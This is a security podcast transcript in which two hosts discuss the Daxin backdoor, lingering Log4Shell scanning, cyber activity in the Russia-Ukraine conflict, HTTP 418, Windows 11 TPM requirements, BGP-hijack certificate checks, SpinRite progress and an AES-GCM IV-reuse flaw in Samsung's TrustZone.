And, I mean, just at this point there's no excuse for not having backups of your systems.  Don't pay the ransom, restore systems and data from backups, and immediately alert law enforcement authorities of the incident.  To do otherwise, all the data suggests, and even common sense as we've seen how this terrain has evolved over the last few years, doing otherwise will just be futile.  You'll end up losing money to the bad guys.  They'll be happy to take your money.  And you'll still be in trouble.  So it just doesn't, at this point, makes no sense to pay up.  There's just no logic behind it.  Unless, again, as I said, understanding all of this you still make the calculus for some other reason that it's the only way out is to pay the ransom and then hope for the best.



Okay.  Daxin.  D-A-X-I-N.  Yesterday, also yesterday, Symantec's Threat Hunter team, which is now part of Broadcom Software, posted really interesting details of what is by far the most technically sophisticated Chinese backdoor malware these researchers had ever seen.  And, you know, it's one thing when script kiddies get something from GitHub and go scan and hope that they get lucky.  The whole idea of malware being really, really good is unnerving, like on a different level. 



LEO:  Makes me think a government wrote it, not script kiddies; you know?  It's a little scary.



STEVE:  Yeah, yeah, yeah.  Exactly.  This is not, as we will see, Daxin did not come from no script kiddie.  And we're only ever talking about stuff that Russia is doing, and China is doing.  I just have to hope, because things are getting crazy in the world right now, you have to hope that our government is every bit as competent and has, like, over there they're doing podcasts about us and stuff that they're finding from the NSA, much as we're talking about China malefactors.



Anyway, their post, Symantec's post stated that the malware appears to be used in a long-running, and I'll put some dates on that in a minute, espionage campaign against select governments and critical infrastructure targets.  Daxin, as they named it, allows an attacker to perform various - oh, I've got that way turned - turn that - sorry about that.



LEO:  Is that Pebbles?



STEVE:  It was actually a four year old, the four-year-old son of someone on CompuServe.



LEO:  Oh, cute.  Oh, cute.



STEVE:  And I've had that sound file from the days of CompuServe.



LEO:  Yeah, which means the kid's 38 now.  But okay, fine.



STEVE:  Yeah, exactly.  And does not want to be reminded of the way he sounded back then.



LEO:  No, oh, man.



STEVE:  So Daxin, as they named it,  allows an attacker to perform various communications and data-gathering operations on the infected computer, and it was seen in use as recently as November of 2021, so a few months ago, by attackers linked to China.  Most of the targets appear to be organizations and governments of strategic interest to China.  And further strengthening the Chinese Daxin link is the fact that other tools also commonly seen and associated with Chinese espionage actors have also been found on some of the computers where Daxin had been deployed.



Symantec's researchers were extremely impressed and said that, considering Daxin's capabilities and the nature of its deployed attacks, it appears to be optimized for use against hardened targets, allowing the attackers to burrow deep inside a target's network and exfiltrate data without raising suspicion.



And this is not all just theoretical.  Thanks to Broadcom's membership in the Joint Cyber Defense Collaborative (JCDC), Symantec researchers worked with CISA, our Cybersecurity and Infrastructure Security Agency, to engage with multiple foreign governments targeted by Daxin, and assisted in its detection and remediation.  So these guys have been on the front line with this thing.  Symantec feels that this one will be worthy of multiple blog postings, but they provided sufficient meat for us in their first disclosure.



Daxin is a Windows kernel driver, which is a bit chilling due to the unfettered power that anything operating in the kernel has.  And this makes it a relatively rare format for ransomware.  It implements sophisticated communications functionality, which both provides a high degree of stealth and permits the attackers to communicate with infected computers on highly secured networks, including and specifically those where direct Internet connectivity is not available.



Its capabilities suggest that the attackers invested significant effort into developing communication techniques that can blend in unseen with normal network traffic on the target's network.  Specifically, the malware avoids starting its own network services.  Instead, it commandeers legitimate services already running on infected computers.  It's capable of relaying its communications across a network of infected computers within the compromised organization network.  The attackers can select an arbitrary path across infected computers and send a single command that instructs these computers to establish requested connectivity.



This use case has been optimized by Daxin's designers.  By using network tunneling, attackers are able to communicate with legitimate services on the victim's network that can be reached from any infected computer.  So it's essentially a backdoor allowing an attacker to perform various operations on the infected computer such as reading and writing arbitrary files.  The attacker can also start arbitrary processes and interact with them.  While the set of operations available to Daxin is quite narrow, this was deliberate because its real value lies in its stealth and its communications capabilities.



Okay.  So listen to this.  Daxin is capable of hijacking legitimate TCP connections on the fly.  It does this by intercepting and monitoring all incoming TCP traffic for certain patterns.  Whenever any of these patterns, in other words triggers, when any of these patterns are detected, Daxin disconnects the legitimate recipient of the traffic and takes over the connection.  It has an entire TCP/IP stack that it brings along on its own.  It then performs a custom key exchange with the remote peer, with both sides following complementary steps to perform that negotiation.



The malware can be both the initiator and the target of a key exchange.  And as we know, the beauty of a public key exchange is that the exchange traffic need not be secret, and an eavesdropper cannot learn the key which is negotiated during the exchange.  A successful key exchange opens an encrypted tunneled communications channel for receiving commands and sending responses.  Daxin's use of hijacked TCP connections affords a high degree of stealth to its communications and helps to establish connectivity on networks with strict firewall rules.



So, for example, say that some organization maintains any sort of public-facing service, such as a website.  Daxin would get into the web server, hook into its pre-encrypted and post-decrypted communications, monitoring them for a magic cookie.  Once that magic cookie is seen, Daxin knows that the remote attacker, looking just like anyone else on the Internet, has connected and emitted what looks like any other web query.  But at that point it takes over the connection from the web server, negotiates its own encryption key with the remote individual that sent the magic cookie, then switches to its own private encryption, tunneling its communications through the existing connection.



To anyone looking, this is just an HTTPS connection like a bazillion others.  It's encrypted already, so this double layer of encryption goes unseen.  But of course it's not like any other connection.  Daxin's built-in functionality can be augmented by deploying additional components on the infected computer.  It provides a dedicated communication mechanism for such components by implementing a device named \\.\, which is a standard Windows nomenclature for a device driver, TCP4.  The malicious components can open this device to register themselves for communication.  Each of the components can associate a 32-bit service identifier with the opened TCP4 handle.  The remote attacker is then able to communicate through Daxin with selected components by specifying a matching service identified when sending messages of a certain type.  The driver also includes a mechanism to send back responses.



So this basically, this sets up an entire private communications infrastructure.  There are dedicated messages that encapsulate raw network packets to be transmitted via the local network adapter.  Daxin then tracks network flows, such that any response packets are captured and forwarded to the remote attacker.  In other words, it serves as a bidirectional network tap, allowing the attacker to establish and to tap communications with any legitimate services that are reachable from the infected machine on the victim's internal network.



One of Daxin's most powerful and unique capabilities is its ability to create multi-hop communications channels across multiple infected computers, where the list of nodes is provided by the attacker in a single command.  For each node, the message includes all the details required to establish communication:  the node's internal IP address, its TCP port number, and the credentials used during custom key exchange.  When Daxin receives this message, it picks the next node from the list.  Then it uses its own internal TCP/IP stack to connect to the TCP server listed in the selected entry.



Once connected, Daxin starts the initiator side protocol.  If the peer computer is infected with Daxin, this results in opening a new encrypted communication channel.  An updated copy of the original message is sent over this new channel, where the position of the next node to use is incremented.  The process then repeats for the remaining nodes on the list.  And if it sounds familiar, that's because it's a bit like onion routing, and it allows Daxin's influence to gradually permeate and penetrate deep inside a highly protected network environment as its remote attackers gradually map out and remotely explore the network environment they have infected.



The Symantec Threat Hunter team has identified Daxin deployments in government organizations, as well as entities in the telecommunications, transportation, and manufacturing sectors.  Several of these victims were identified with the assistance of the Singapore-based PwC Threat Intelligence team.



While the most recent known attacks involving Daxin occurred in November of 2021, the earliest known sample of the Daxin malware dates from nine years ago in 2013.  And that malware had already incorporated all of the advanced features seen in the most recent variants, with a large part of the codebase having already been fully developed at that time nine years ago.  This suggests that the attackers were already well established by 2013, with Daxin's features reflecting their expertise back then at the time.



And Symantec believes that it goes back even further.  An older piece of backdoor malware known as Zala (Z-A-L-A) contained a number of common structural features, but lacked many of Daxin's advanced capabilities.  Daxin appears to build on Zala's networking techniques, reusing a significant amount of distinctive code, and even sharing certain magic constants with Zala.  And they also share the use of a certain public library which is used to perform the kernel, the Windows kernel API hooking that is also common between variants of Daxin and Zala.



The extensive sharing and common codebase indicates that Daxin's developers at least had access to Zala's codebase.  They believe that both malware families were used by the same Chinese-linked actor, which became active no later than 2009.  So an additional four years before 2013, when Daxin was first seen.  So needless to say, this is not something that anyone wants to have crawling around inside their networked machines.  And you have to ask yourself, you know, how sure are you that you don't have it?



LEO:  Not that it matters at all, but it's probably, because it's Chinese, Da Xin, Da being one word and Xin being pronounced "shin."



STEVE:  Ah.



LEO:  But I think Daxin is fine.  It's just that's probably Chinese, I would guess; right?



STEVE:  I bet it is, thank you.



LEO:  Bet it is, yeah.  If you said Da Xin, I would say, c'mon, man.  C'mon, man.  I know how to pronounce Log4j, that's for sure.



STEVE:  That's true.



LEO:  Although some people say "log forge," which I think is wrong.



STEVE:  Oh.  I think it is, too.  



LEO:  Yeah.  Now, "Log Forge."



STEVE:  Yeah.  So the chart, I've got a chart here in the show notes which begins on the 10th of December last year with a big spike.  Then it drops a bit.  And then it just sort of shows a nice mountain, you know, going up one side and coming down the other.  There is a weird, very, very tall spike, kind of late in the game.  It turns out that's been attributed to a one-day coordinated security scan by a security firm.  So that's not attack traffic.  But mostly what we see is a lot of initial interest.  And then it kind of dies off.



Johannes Ullrich, the security guy over at SANS who documented this Log4j scanning activity, said:  "Our sensors detected exploit attempts almost immediately," meaning with the original release of the Log4j news.  And of course, as we know, Log4Shell exploit vulnerability scanning experienced a large cross-Internet spike in activity as threat actors around the world began searching the Internet frantically for Java apps that might have used the Log4j library and were testing the exploit to see what was vulnerable.



But with the advantage now that we have of hindsight, a couple months' worth, we can see that this spike in activity lasted for maybe about three weeks, until the end of 2021.  So basically through December.  And as we've noted here previously, one of the reasons for attackers losing interest in Log4Shell, the exploit of Log4j which was the library, was the complex nature of the Java ecosystem which resulted in the Log4j library being used and implemented in different ways across Java apps.  That meant that a drop-in, dead simple universal exploit wasn't available; and that the first exploit that was published, which set off the gold rush scanning frenzy, turned out to be not so universal after all.



Bad guys had to reverse engineer individual Java apps, figure out how and where they were using Log4j, and then try different exploit variations to see what worked best.  In other words, by definition not script kiddie-compatible.  This entire process was and still is complex and time-consuming.  And given that other new vulnerabilities - oh, look, there's something shiny - new vulnerabilities are being disclosed on a nearly daily basis, some of which are easier to exploit, Log4j was soon relegated to the "perhaps I'll get back to that eventually" category.



But that doesn't mean that these are not the droids you're looking for, so move along.  The threat is still real.  And if you look at that graph, the scanning has not gone down to zero.  It's still kind of percolating along there.  It's just very good news that the first example of an exploit was only the lowest of the hanging fruit.  The fact that the rest of the fruit may well be, is still there but is well out of reach, casual reach, just means that it's moved into the longer term toolkit of the world's more serious actors.



So a case in point actually of exactly this was SentinelOne's  recent report that one of Iran's state-sponsored groups was exploiting the Log4Shell vulnerability to compromise VMware Horizon servers recently.  This was only a couple weeks ago.  This confirms that not all attackers have lost interest in the vulnerability, and that the threat remains present for companies running unpatched Java systems.



So I just, you know, we talked about this having gone away.  I just wanted to make sure that people understand this is going to be an issue.  Unfortunately, it is beginning to take the shape of all these other problems that we have that never completely go away anymore.  We understand from what Google's research showed that we talked about initially, that fixing the existing installed base of Java cannot possibly be an overnight event.  Thanks to the complexity of new attacks, as an industry as a whole we did dodge a bullet.  So we don't want to get cocky because the other thing that the chart shows, as I said, is that scanning has never returned back to zero.  It's now holding constant.



Okay.  As everyone knows, we're in the midst of an interesting time.  Russia's President Putin has directed Russia's military to launch an attack against Ukraine.  Many did not believe it would happen, and the world is still recovering from its shock.  But happening it is.  We're talking about this here because, as I mentioned briefly last week, the attacks have not only been conventional.  They have also had a prominent and evolving cyber component.  And while there has been a longstanding low-level cyber standoff between major global adversaries, and we'll talk a little bit more about that in a minute, we haven't yet experienced what any country might be able to unleash upon another.



And frankly, having listened to well-placed and well-informed experts in the U.S., everyone is a bit afraid to see what full-scale cyberwarfare might look like.  We know what happens when you shoot a bullet, when you launch a missile, or roll a tank.  Though the effects can be deadly, they are understandable and contained.  But the presumption held by everyone is that all of the major powers have already deeply infiltrated each other's networks.  And, I mean, that Daxin thing I was just talking about is a perfect example.  It's like, that is just creepy, to think that something that powerful is scattered around.  And apparently it is.  And with this infiltration of each other's networks is the planting of cyber bombs and booby traps.  And no one's really anxious to go first.  So as I said, we're in the midst of an interesting time.



Last week, the day after I mentioned the previous Russian DDoS attacks against Ukraine's military and some of its banking infrastructure, additional DDoS attacks were launched against those same Ukrainian facilities.  In response, the Ukrainian government issued a call to arms to local hackers, after which alleged "hacktivists" claimed credit for knocking the website of the Russian state-run news service RT News offline.  And, you know, if we all just keep this at the level of DDoS attacks, we're going to be fine. 



Then last Thursday Russian government websites went dark to some parts of the world after being targeted with a flood of web traffic via a DDoS attack which attempted to knock them offline.  No one has claimed credit, so it's unclear who directed the attack, or if it was successful in disrupting sites.  The reason there's some question about the success of the attacks is that the websites in question began claiming to be teapots.  Now, presumably Russian teapots.



LEO:  What?



STEVE:  We've talked about this before, but it's due for a refresher.  A web server replying to an HTTP query begins its reply with a three-digit code to indicate the server's overall response to the query.  Any response beginning with a "1" is informational.  Responses beginning with a "2" indicate success; "3" indicates one of a number of redirection types, like temporary so don't remember the redirection, or this is permanent so please don't ask for that old URL again.  Responses beginning with "4" represent a client error, that is, like asking for something bad; and "5" is a server error.



Within that framework, 200 is the most common code representing success, and everyone is familiar with the infamous "404 error," which means that the resource being requested was not found or does not exist on the server.



Back on April 1st of 1998, thus the traditional April Fools' Day, Internet RFC 2324 was offered to describe and standardize version 1.0 of the HTCPCP.  HTCPCP is, of course, the lesser known Hyper Text Coffee Pot Control Protocol.  In describing the rationale and scope of the proposed HTCPCP protocol, this RFC explains:  "There is coffee all over the world.  Increasingly, in a world in which computing is ubiquitous, the computists want to make coffee."



LEO:  Sure they do, yeah, yeah.



STEVE:  Coffee brewing, yeah, I mean, it's self-evident; right? 



LEO:  Sure, yeah.



STEVE:  "Coffee brewing is an art, but the distributed intelligence of the web-connected world transcends art.  Thus there is a strong, dark, rich requirement for a protocol designed 'espressoly' for the brewing of coffee."



LEO:  Oh, dear.



STEVE:  "Coffee is brewed using coffee pots.  Networked coffee pots require a control protocol if they are to be controlled.  Thus this document specifies a Hyper Text Coffee Pot Control Protocol (HTCPCP), which permits the full request and responses necessary to control all devices capable of making these popular caffeinated hot beverages."  Okay.



LEO:  This is because of the Cambridge Coffee Pot; right?  The very first webcam?  Yeah.



STEVE:  Yeah.  With that background, the protocol needed to provide for an error in the event that the Hyper Text Coffee Pot Control Protocol was inadvertently applied to a non-coffee pot.



LEO:  Yes.



STEVE:  The HTTP response 418  beginning with the digit "4" which is universally used to signify an error made by the client  was thereby defined to mean "I'm a teapot."



LEO:  Oh, that's great.



STEVE:  And thus not the appropriate target of the HTCPCP protocol.  The formal definition of error 418 says:  "The 'HTTP 418 I'm a teapot' client error response code indicates that the server refuses to brew coffee because it is permanently a teapot."



LEO:  This is an April Fools' Joke, but it's a real - but they implemented it.



STEVE:  Yes.  Yes.  "A combined coffee/tea pot, that is only temporarily out of coffee, would instead return an error 503."  You know, just to be particular about that.  And in fact, Leo, there was a move some years ago to remove the "418 I'm a Teapot" from Java.  And as I recall, a 15 year old started, like created a website, like saved the 418 code.



LEO:  Oh, man.



STEVE:  Which generated so much momentum that 418 was formalized and reserved, and the other languages that were considering pulling it all decided, nope, we're going to leave 418 in there.



LEO:  If you go to Google.com/teapot, you actually get a 418.  So even Google's in on this one.



STEVE:  So the upshot of all this is that some websites use, actually do use the 418 I'm a Teapot response for requests they do not wish to handle, such as automated queries.  And that is the response that the mil.ru Russian website and a few others began returning last Thursday.



LEO:  Wow.



STEVE:  This is believed to be a geofencing measure, denying any further processing of incoming IP traffic outside of Russia.  So at least in this case the sites in question are not down due to DDoS, they are administratively blocked to non-Russian Internet traffic.  And, clearly, you're a teapot.



LEO:  Very funny.  Very funny.  Yeah, I saw a number of people initially saying, oh, these sites are down, these sites are down; and others saying use a VPN exiting in Russia, and they're still up.  It's just geofencing.



STEVE:  Yup.  We can't get to them.  And in fact we did talk at some length some time ago about Russia having deliberately experimented, and it was a little spooky at the time, with their own DNS system, rather than relying on the...



LEO:  Oh, they have their own GPS, GLONASS.



STEVE:  Right.  Well, but normally DNS relies on the global root servers, and DNS won't work without the root servers.  Well, they've implemented an internal DNS facility that would allow Russia to go off the Internet and become a self-sustaining, you know, it wouldn't all just go down and dark for everybody.  I mean, without connectivity to the rest of the world you have a rather proscribed Internet.  But still it would be up and running.  And vital services and things presumably would be using Russki DNS as opposed to regular DNS.



So on the question "Will the U.S. Attack?," last Thursday NBC News headlined their story "Biden has been presented with options for massive cyberattacks against Russia" with the subhead "The options presented include disrupting the Internet across Russia, shutting off power, and stopping trains in their tracks."  Whereupon the White House immediately denied the report that President Biden has been presented with an arsenal of ways to launch massive cyberattacks against Russia, attacks which would be designed to disrupt Russia's ability to sustain its military operations with Ukraine.



Within hours of the report, Press Secretary Jen Psaki said in a tweet that NBC got it wrong.  She tweeted:  "This report on cyber options being presented to @POTUS is off base and does not reflect what is actually being discussed in any shape or form," she said.  However, NBC subsequently made clear that they felt their reporting was quite well sourced, accurate, and noted that the White House had not indicated what about the story was incorrect.



NBC's sources, which were cited as "two U.S. intelligence officials, one Western intelligence official, and another person briefed on the matter," told NBC that no final decisions had been made as of earlier Thursday.  One of those sources said the possibilities range from the aggravating to the destructive:  "You could do everything from slow the trains down to have them fall off the tracks," said the source, who'd been briefed on the matter.  In other reporting there were passing references to messing with train track switches.  So I think that gives us some further information.



But that source also said that most of the potential measures on the slate of possible cyberattacks -a slate again Press Secretary Psaki said was inaccurate - would not be destructive but would rather be designed to be disruptive, hence falling short of an act of war by the United States against Russia, according to NBC.  To which I say wow to all that.



One of the problems with that sort of interference is that it would almost have to leave footprints.  If President Biden were being provided with these options, he would also certainly be told that this would inevitably be tipping our hand to Russia about at least the cyber capabilities that were used because they would be exposed.  If the U.S. is really able to shut down Russian rail transportation, or run their trains off the rails, that's a significant capability that one would not want to waste since it could probably never be used again.  So the question is, is this the time to use and inevitably expose such a capability, assuming that it could not be used again?



And it would definitely aggravate Russia and almost certainly trigger a response.  The main trouble, as I've noted before, is that all sides are keenly aware that no one is able to withstand a cyberattack.  Today, everyone depends crucially upon their networks, yet everyone's networks are a true mess.  Everyone has instances of crappy software still running which was written long before security was a consideration.



And as we've seen, and as this podcast chronicles ad nauseam, even today, when network security is given extensive lip service, we're still unable to get it right.  In a few minutes we're going to be talking about a catastrophic mistake Samsung recently made, or made actually a while ago and had continued, which cripples the security of 100 million of their Android handsets.  We still don't have the structures in place to get security right today.  The only good news is we're not alone.  No one else does either, and we're all using the same crappy software.  As a consequence, no one dares to pull that trigger.



Okay.  Last Wednesday I was working away on SpinRite.  I had Windows Weekly running in the background, as I often do.  Leo, you, Paul, and Mary Jo were talking as you guys always do about what's on your minds regarding Microsoft, Windows, the Enterprise, and often the industry at large.



BEGIN CLIP WINDOWS WEEKLY 765



PAUL:  Yeah, so today, in case you thought things hadn't changed, Microsoft arbitrarily - and by the way, we know for a fact arbitrarily decided on Windows 11's hardware requirements.  Right?  And they did it to help the PC industry. 



LEO:  So all the TPM 2.0 stuff, the 8th Generation Intel...



PAUL:  8th Gen, exactly.  Completely arbitrary.



LEO:  It runs fine on the earlier stuff.



MARY JO:  So, you know, it's very interesting to me they are not blocking the people from running it; right?  Like there are so many who do it.



PAUL:  But you know what, though, if they did, I think there would have been a lawsuit and a class action lawsuit.  And one of those things that would have come out is what I just said, that those hardware restrictions are completely arbitrary, and that people who run Windows 11 on non-supported hardware are in fact not endangering the community.  They're not, you know, there's nothing bad going on at all, and that Microsoft just did this arbitrarily or artificially, I should say, to help drive PC sales.



MARY JO:  Yes.



END CLIP WINDOWS WEEKLY 765



STEVE:  Okay.  Now, I mean, so I stopped coding SpinRite.  It's like, my mouth hung open.  For Paul to just say so matter-of-factly, "We know it for a fact."  Now this, of course, well, not that we know it for a fact, but our listeners, this podcast's listeners have been putting up with me ranting about this from the first moment that this issue arose because from a software engineering, computer science standpoint, which is the only thing I care about and the only thing that matters, whether Microsoft wants it to be true or not, it had to be that Microsoft was deliberately and calculatingly lying to the entire world.



What Microsoft was saying about their "uncertainty" over which systems Windows 11 could be safely run on simply could not be true.  It was not possible.  It wasn't computer science.  It had to be management-driven, marketing-inspired gibberish.  Recall that Security Now #835 was titled "TPM v1.2 vs 2.0."  During that podcast, because this thing just was driving me crazy, we looked feature by feature through the differences between the two, searching for any rational computer science justification for Microsoft to require Windows 11 to have TPM 2.0 over 1.2 while Windows 10 was working quite happily with version 1.2.  We found none.  Not one.  What we found was that Microsoft was already using TPM 1.2 for everything they wanted to protect with TPM 2.0.



Now, it may seem odd, but I would have no problem at all if Microsoft had just told the truth.  If they had said that they don't want Windows 11 to run on older machines because they want to require people to purchase new hardware when they upgrade their software, I couldn't have cared less.  That would have been fine with me because it would have been the truth.  Of course, it would have infuriated everyone else.



Now, I don't know what I will do on October 14th of 2025 when support might be ending for Windows 10.  I'll have a large stable of machines, as will many people, that would happily run Windows 11 just fine.  And by then we can hope that all of the nonsense changes they've been making to Windows 11 will have settled down.  By that time we'll all be able to upgrade our machines that don't currently qualify to run Windows 11.  Will we be able to upgrade them?  Will Microsoft decide, okay, gee, guess what, surprise, it works just fine?  It's difficult to imagine not.  And there's just no other way to look at this other than Microsoft having really messed this thing up.  This is just sad.  But anyway, it was very refreshing, Leo, to hear the gang over on Windows Weekly say yeah.



LEO:  Yeah, yeah, yeah,



STEVE:  Everyone knows that.



LEO:  Yeah.



STEVE:  I was like, oh.  Well, that's good because it had to be true.  Wow.  I had a piece of closing-the-loop feedback.  Someone sent me:  "Hi, Steve.  How can I get the AS number of my bank?  NSLOOKUP doesn't do it.  I want to check before I enter my password that the ASN hasn't changed.  A little bit of personal self-help to avoid a BGP attack on my money."



And that was a good question.  Of course, he's talking about last week's topic which was the BGP attack where some very clever guys managed to reroute some traffic to a different location.  And it does, it sort of begs the question, what could someone do?  Okay.  And the answer is, first of all, just to clarify, individual entities like a bank or like GRC or like TWiT do not have AS numbers.



I actually regret not getting one for myself back like when I first got my GRC Internet connectivity because I could have back then.  There were plenty of IPv4 addresses.  Nobody thought they were going to expire.  You have to have at least a Class C network in order to be an AS.  So had I obtained a Class C network, I would own my own block, something something something dot something something something dot something something dot star.  I would own a Class C network that would be mine.  I would be an AS.  And so when I went from Verio over to Level 3, I would have transported that IP space with me.  And the routing tables would have changed so that the packets bound for my block of IP addresses now went to Level 3, where they used to go to Verio.  My IPs would have never changed.



Instead, I'm not an AS.  That never occurred to me.  I didn't think of it.  I've got a block of IPs.  And when I did move to Level 3, they all had to change.  DNS had to propagate some.  It's not the end of the world, but it's just not quite as cool.  But the point is individual entities don't have them.  Networking companies do.  So what would change would be the certificate.



And that's where GRC's certificate fingerprinting comes in.  What had to happen for that BGP attack to get pulled off as it was, was the moment the IP addresses were rerouted, they applied with an entity supporting the ACME automation API, like, for example, Let's Encrypt.  They applied for a certificate for the domain they were hijacking.  And at that point all of the traffic was coming to them.  So Let's Encrypt was able to verify that they were the apparent owner of that domain and would instantly give them a certificate.



But it wasn't the certificate of the bank; right?  It wasn't the actual certificate for whatever it was, developers dot something dot something.  It was a different certificate that had just been minted for that because the actual owner of that domain is protecting their certificate as one of their most prized possessions.



So to answer this listener's question, if you were really concerned, you would look at the certificate of those few entities where you absolutely want to make sure you never have a connection spoofed, and look at the so-called thumbprint of the certificate, which it must change if a different certificate is issued.  It does change, even like for me, every couple years, now every year for all of us.  When our certs change, we get a different thumbprint.  The certificate, even if it's issued from the same CA, it will have a different timestamp.  It'll have, I mean, it is a different key.  So everything about it is different.  The hash will be different.  The thumbprint will be different.  So that would set off a false positive when that domain rekeys.  So it's a little less useful to do that.



But anyway, I thought that was sort of an interesting question.  How would you protect yourself against being the victim on the user end of a BGP attack?  And it would be that the authentic certificate could not be the one you're connecting to.  And so that's what to check.



LEO:  Good to know.



STEVE:  I'll just mention before we take a break that SpinRite's 9th development pre-release went out last week, as I expected it would, and I'm pleased to report that it was a significant win.  Reports of it successfully working across a number of systems where previous releases had not were posted to confirm that the things I believed were fixed were indeed fixed.  After that we found and I fixed a problem with the BIOS on a Supermicro motherboard, and we also found and I fixed a new bug that I had introduced with the new mini-benchmark which directs SpinRite to use the firmware for its bulk scanning when the system is somehow faster than my own hardware drivers.  We've seen that a little bit.  It's not a huge win, but we want SpinRite to be as fast as possible.  And if that means using an existing adapter's own firmware, so be it.



At this moment, because I just hadn't had the chance to dig into it, we do have a couple odd problems that have been found, so I'll be digging into that this evening.  But it feels as though we're getting very close to having these last few bits resolved, with SpinRite able to operate robustly on every piece of hardware anyone has tested, which is around 300 people, generally each with multiple machines.



And I have to admit I'd been holding my breath on this one since the immediately previous release was December 23rd.  And since I had re-engineered SpinRite's hardware interrupt handling, made many other improvements, introduced the mini-benchmark and the awareness of the possibility of system firmware being faster, everything was working on my systems, but none of it had been widely tested by our development community.  So today I'm feeling quite relieved to have our testing gang synchronized and up to date with SpinRite's latest code, which has now largely been proven.



So as I said, I'll be back to it this evening, get the few remaining problems fixed.  And at that point, SpinRite's all-new hardware interface platform will be in place, not only for 6.1, but also for 7 and beyond.  And it really is the case that now, or at that point, most of the hard work will be behind us.  And it won't be that much longer before it will push past the point where testing stops now and SpinRite will actually be running out on the surfaces of these drives.  So, whew.  What a project.  But worthwhile.



LEO:  Working hard.  I love it.  Now, Truth Dies in Darkness.



STEVE:  Yeah.  The academic research paper written by a trio of researchers at the University of Tel Aviv will be presented during the upcoming USENIX Security 2022 symposium.  That's this summer.  Their paper is titled "Trust Dies in Darkness:  Shedding Light on Samsung's TrustZone Keymaster Design."



The paper is extremely interesting due to the specific mistakes it finds and highlights and describes in some detail.  But it carries, and this is what I found so refreshing, it makes very explicit a far more important and overriding message that this podcast's listeners have been hearing from me for years, which is that important, high-volume, widely used, critical technologies cannot remain proprietary and secret.  They simply can't.  As a global society we must change the way we think about these things.  Somewhere around 100 million Samsung Android smartphone users cannot be allowed to carry critical security technology that no one else has ever been allowed to examine.  But that's the world we have today.



My favorite example that we've frequently discussed here is voting machines.  How is it conceivable that closed, proprietary, inherently secret, electronic voting machines were ever allowed to be deployed and used within the United States?  How?  The U.S. could have easily used its buying power to require the use of an open design or fully independent public examination and auditing of these machines.  The idea that the value added is not the proprietary hocus pocus firmware, you know, we've got that wrong.  The value-added should be the hardware implementation which uses generic, widely vetted, and completely transparent software.  But that's not what we do.



Okay, as for today's latest example of how this fallacy of secrecy has landed the very well meaning, but misguided, Samsung in hot water, in the abstract of their 20-page paper, the researchers explain.  They say:  "ARM-based Android smartphones rely on the TrustZone hardware support for a Trusted Execution Environment (TEE) to implement security-sensitive functions.  The TEE runs a separate, isolated TrustZone Operating System (TZOS), in parallel to Android.  The implementation of the cryptographic functions within the TZOS is left to the device vendors, who create proprietary undocumented designs."  Which turns out to be these guys' hobby horse just as much as it is mine.



They said:  "In this work, we expose the cryptographic design and implementation of Android's hardware-backed Keystore in Samsung's Galaxy S8, S9, S10, S20, and S21 flagship devices.  We reverse engineered and provide a detailed description of the cryptographic design and code structure, and we unveil severe design flaws.  We present an Initialization Vector (IV) reuse attack on AES-GCM that allows an attacker to extract hardware-protected key material, and a downgrade attack that makes even the latest Samsung devices vulnerable to the Initialization Vector reuse attack.  We demonstrate working key extraction attacks on the latest devices.



"We also show the implications of our attacks on two higher level cryptographic protocols between the TrustZone and a remote server.  We demonstrate a working FIDO2 WebAuthn login bypass and a compromise of Google's Secure Key Import.  We discuss multiple flaws in the design flow of TrustZone-based protocols.  Although our specific attacks only apply to the around 100 million devices made by Samsung, it raises the much more general requirement for open and proven standards for critical cryptographic and security designs."



Okay.  So a couple of things.  ARM's Trusted Execution Environment (TEE) is their version of Apple's Secure Enclave, or the PC's TPM, or what Intel refers to as their Trusted Execution Technology (TXT).  In every case, this notion of sequestering secrets and secret operations is a tacit acknowledgement of our generic inability to secure any larger attack surface.  There's no actual computer science reason why the entire computer system cannot be secure.  Except that we've tried over and over and over, until we finally just gave up, recognized and accepted the reality that as an industry we don't know how to do that yet.  We cannot secure our own systems.  It's beyond us.



So all these various enclaves of whatever name they take are an attempt at encapsulation.  The thinking is, if we can just separate the system's most critical and crucial operating secrets, and the limited set of operations we need to perform with those secrets, from the rest of the wild and woolly and totally beyond our control system, then at least we can keep those secrets secret.



What these guys found, at tremendous expense to themselves because this was all locked tightly away and considered to be proprietary, and they've demonstrated, is that around 100 million of Samsung's Android-based smartphones contain a fundamental and horrifyingly simple and obvious in retrospect design flaw which can be readily exploited to completely compromise any Samsung smartphone's most tightly held secrets.



We talked a long time ago about what's known as "authenticated encryption."  The idea is that if you want to secure a secret, you need two things.  You need to encrypt it for secrecy, and you also need to somehow detect any tampering with the secret.  So you need both encryption of the plaintext and cryptographic authentication that the message has not been modified.  Our longest time listeners will recall the industry's wrestling back and forth with the question, should you encrypt first, then apply authentication to the encrypted result?  Or should you authenticate the plaintext first, and then encrypt that whole authenticated result?  Does it matter?  Many early systems didn't think it did.  So they tossed a coin or perhaps did what was easiest.  But either way, they often got it backwards.



There's only one right answer.  The only right answer is that when both encrypting and authenticating, you always encrypt first and apply authentication last.  The reason is the first thing you want to do upon receiving the result for decryption  is to authenticate that the received package has not been tampered with.  You never decrypt first, then authenticate.  And if anyone's wondering how we got to 860 episodes of this podcast, and why my hair is no longer black, it's because we spent a lot of time back in the old days closely examining those questions and the security doing it wrong could compromise.



SQRL, as I mentioned at the top of the show, needed authenticated encryption to protect its user's key material and the client's settings.  Windows is a nonsecure operating system, and the SQRL identity that's stored in Windows is just a file on the file system, with no protection.  So SQRL needed to protect that file.  And Samsung was in the same situation.  They have so-called "blobs" that are on the file system that is this keying material.



So like AMD and Samsung, AES-GCM  Advanced Encryption Standard Galois Counter Mode  is the authenticated encryption algorithm I chose for SQRL.  So did Samsung.  And as I mentioned, I wrote my own implementation of it in C since I wanted to, and did, open source it.  AES-GCM is elegant because it simultaneously encrypts and authenticates as it goes.  It will absolutely positively not decrypt and authenticate anything that's been altered after it was encrypted with this AES-GCM because it's both.  And that's what I needed for SQRL.  AES-GCM is, however, a bit brittle.



Coincidentally, we were talking recently about brittle encryption and mistakes being made in cryptographic implementations.  Last week was how the guys who wrote the Hive ransomware got their encryption wrong.  There are many instances in cryptography where something must only be used exactly once.  Of course the famous one-time pad has its uses restriction in its name.  Last week's XOR keystream reuse was what hit and bit the Hive guys.



And AES-GCM requires the use of a so-called Initialization Vector, the IV.  The IV can be anything.  And it's never a secret because it's required to reverse the process.  So it's always out in full view.  But the crucial requirement that makes AES-GCM somewhat brittle, that means you need to use it with care, with full awareness of what could go wrong, is that much as with an XOR keystream, AES-GCM's Initialization Vector must never be reused.



